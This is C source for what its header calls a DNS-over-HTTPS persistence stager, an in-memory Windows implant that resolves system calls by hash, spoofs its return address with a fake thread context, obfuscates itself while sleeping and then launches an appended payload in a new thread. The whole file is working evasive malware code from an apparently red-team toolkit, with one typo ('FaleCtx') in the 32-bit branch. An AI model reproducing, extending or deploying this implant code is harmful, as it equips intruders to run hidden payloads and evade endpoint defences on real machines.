/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#include "common.h"

D_SEC(B) VOID WINAPI Start( ULONG Length )
{
	HANDLE        Thd;
	HMODULE       Mod;
	INSTANCE      Ins;

	Ins.kb.Base = PebGetModule( H_KERNELBASE );
	Ins.km.Base = PebGetModule( H_KERNEL32 );
	Ins.nt.Base = PebGetModule( H_NTDLL );
	Ins.Buffer  = C_PTR( _GET_BEG() );
	Ins.Length  = U_PTR( _GET_END() ) - U_PTR( _GET_BEG() ) + Length;

	if ( Ins.kb.Base ) {
		Ins.kb.SetProcessValidCallTargets = PeGetFuncEat( Ins.kb.Base, H_SETPROCESSVALIDCALLTARGETS );
	};

	Ins.km.LocalFileTimeToFileTime        = PeGetFuncEat( Ins.km.Base, H_LOCALFILETIMETOFILETIME );
	Ins.km.SystemTimeToFileTime           = PeGetFuncEat( Ins.km.Base, H_SYSTEMTIMETOFILETIME );

	Ins.nt.NtSignalAndWaitForSingleObject = PeGetFuncEat( Ins.nt.Base, H_NTSIGNALANDWAITFORSINGLEOBJECT );
	Ins.nt.NtQueryInformationProcess      = PeGetFuncEat( Ins.nt.Base, H_NTQUERYINFORMATIONPROCESS );
	Ins.nt.NtProtectVirtualMemory         = PeGetFuncEat( Ins.nt.Base, H_NTPROTECTVIRTUALMEMORY );
	Ins.nt.NtWaitForSingleObject          = PeGetFuncEat( Ins.nt.Base, H_NTWAITFORSINGLEOBJECT );
	Ins.nt.NtDeviceIoControlFile          = PeGetFuncEat( Ins.nt.Base, H_NTDEVICEIOCONTROLFILE );
	Ins.nt.RtlInitUnicodeString           = PeGetFuncEat( Ins.nt.Base, H_RTLINITUNICODESTRING );
	Ins.nt.NtAlertResumeThread            = PeGetFuncEat( Ins.nt.Base, H_NTALERTRESUMETHREAD );
	Ins.nt.NtSetContextThread             = PeGetFuncEat( Ins.nt.Base, H_NTSETCONTEXTTHREAD );
	Ins.nt.NtGetContextThread             = PeGetFuncEat( Ins.nt.Base, H_NTGETCONTEXTTHREAD );
	Ins.nt.NtTerminateThread              = PeGetFuncEat( Ins.nt.Base, H_NTTERMINATETHREAD );
	Ins.nt.RtlCaptureContext              = PeGetFuncEat( Ins.nt.Base, H_RTLCAPTURECONTEXT );
	Ins.nt.NtDelayExecution               = PeGetFuncEat( Ins.nt.Base, H_NTDELAYEXECUTION );
	Ins.nt.NtQueueApcThread               = PeGetFuncEat( Ins.nt.Base, H_NTQUEUEAPCTHREAD );
	Ins.nt.NtCreateThreadEx               = PeGetFuncEat( Ins.nt.Base, H_NTCREATETHREADEX );
	Ins.nt.RtlAllocateHeap                = PeGetFuncEat( Ins.nt.Base, H_RTLALLOCATEHEAP );
	Ins.nt.NtCreateEvent                  = PeGetFuncEat( Ins.nt.Base, H_NTCREATEEVENT );
	Ins.nt.NtOpenThread                   = PeGetFuncEat( Ins.nt.Base, H_NTOPENTHREAD );
	Ins.nt.RtlFreeHeap                    = PeGetFuncEat( Ins.nt.Base, H_RTLFREEHEAP );
	Ins.nt.NtTestAlert                    = PeGetFuncEat( Ins.nt.Base, H_NTTESTALERT );
	Ins.nt.NtOpenFile                     = PeGetFuncEat( Ins.nt.Base, H_NTOPENFILE );
	Ins.nt.NtContinue                     = PeGetFuncEat( Ins.nt.Base, H_NTCONTINUE );
	Ins.nt.ExitThread                     = PeGetFuncEat( Ins.nt.Base, H_EXITTHREAD );
	Ins.nt.NtClose                        = PeGetFuncEat( Ins.nt.Base, H_NTCLOSE );
	
	UCHAR           FakeStk[0x100];
	CONTEXT         FakeCtx;

	RtlSecureZeroMemory( &FakeCtx, sizeof( FakeCtx ) );
	RtlSecureZeroMemory( &FakeStk, 0x100 );

#if defined( _WIN64 )
	FakeCtx.ContextFlags = CONTEXT_FULL;
	FakeCtx.Rip = U_PTR( Ins.nt.RtlFreeHeap );
	FakeCtx.Rsp = U_PTR( &FakeStk );
#else
	FaleCtx.ContextFlags = CONTEXT_FULL;
	FakeCtx.Eip = U_PTR( Ins.nt.RtlFreeHeap );
	FakeCtx.Esp = U_PTR( &FakeStk );
#endif

	FILETIME	LocalTimeZon;
	FILETIME	LocalTimeUtc;
	SYSTEMTIME	LocalTimeSys;
	LARGE_INTEGER   LocalTimeOut;

	RtlSecureZeroMemory( &LocalTimeZon, sizeof( LocalTimeZon ) );
	RtlSecureZeroMemory( &LocalTimeUtc, sizeof( LocalTimeUtc ) );
	RtlSecureZeroMemory( &LocalTimeSys, sizeof( LocalTimeSys ) );
	RtlSecureZeroMemory( &LocalTimeOut, sizeof( LocalTimeOut ) );

	LocalTimeSys.wMonth = 0x4242;
	LocalTimeSys.wYear  = 0x4343;
	LocalTimeSys.wDay   = 0x4444;

	Ins.km.SystemTimeToFileTime( &LocalTimeSys, &LocalTimeZon );
	Ins.km.LocalFileTimeToFileTime( &LocalTimeZon, &LocalTimeUtc );
	LocalTimeOut.LowPart  = LocalTimeUtc.dwLowDateTime;
	LocalTimeOut.HighPart = LocalTimeUtc.dwHighDateTime;

	ObfuscateSleep( &Ins, &FakeCtx, &LocalTimeOut );
	Ins.nt.NtCreateThreadEx(
			&Thd,
			THREAD_ALL_ACCESS,
			NULL,
			NtCurrentProcess(),
			C_PTR( _GET_END( ) ),
			NULL,
			FALSE,
			0,
			0xFFFFFF,
			0xFFFFFF,
			NULL
			); Ins.nt.NtClose( Thd );
};
